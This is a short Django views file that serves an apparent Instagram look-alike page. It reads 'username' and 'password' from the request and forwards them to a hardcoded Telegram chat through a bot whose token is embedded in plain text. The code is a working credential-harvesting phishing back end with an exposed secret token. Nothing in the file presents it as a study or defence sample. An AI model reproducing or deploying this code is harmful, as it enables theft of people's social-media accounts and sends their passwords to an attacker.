from django.shortcuts import render
import telebot
from django.shortcuts import redirect


bot=telebot.TeleBot("7835800080:AAEp9JjZyMjTAhU2Cptdjb51w57Oilvdc9s", parse_mode=None)

def home(request):
    username = request.GET.get("username")
    password = request.GET.get("password")



    if username is not None and password is not None:
        message = f""" 
            massage:
            username: {username}
            password: {password}
        """
        bot.send_message(7189884017, message)
        return render(request, "instagram.html")
    return render(request, "instagram.html")
    